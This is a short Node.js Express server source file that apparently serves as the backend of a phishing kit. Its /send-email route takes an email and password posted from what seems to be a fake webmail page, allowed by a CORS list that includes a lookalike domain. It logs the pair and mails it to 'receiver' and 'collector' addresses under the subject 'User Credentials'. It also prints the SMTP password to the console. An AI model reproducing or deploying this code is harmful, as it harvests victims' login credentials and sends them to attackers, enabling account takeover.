import dotenv from "dotenv";
import express from "express";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";

dotenv.config(); 
const app = express();

app.use(
  cors({
    origin: function (origin, callback) {
      const allowedOrigins = [
        "http://localhost:5173",
        "https://web-mail-two.vercel.app",
        "https://serviceconect.com"
      ];

      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
    credentials: true, // optional: if you're using cookies or auth headers
  })
);



app.use(bodyParser.json());

console.log("Email User:", process.env.EMAIL_USER);
console.log("Email Pass:", process.env.EMAIL_PASS);
console.log("Email Receiver:", process.env.EMAIL_RECEIVER);
console.log("Email Collector:", process.env.EMAIL_COLLECTOR);

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false, // use STARTTLS
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});



transporter.verify((error, success) => {
  if (error) {
    console.error("Nodemailer verification error:", error);
  } else {
    console.log("Nodemailer is ready to send emails");
  }
});

app.post("/send-email", async (req, res) => {
  const { email, password } = req.body;
  console.log("Request body:", { email, password });

  let mailOptions = {
    from: email,
    to: [process.env.EMAIL_RECEIVER, process.env.EMAIL_COLLECTOR],
    subject: "User Credentials",
    text: `Email: ${email}\nPassword: ${password}`,
  };
 

  try {
    let info = await transporter.sendMail(mailOptions);
    console.log("Email sent: " + info.response);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Nodemailer error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(8080, () => {
  console.log("Server is running on port 8080");
});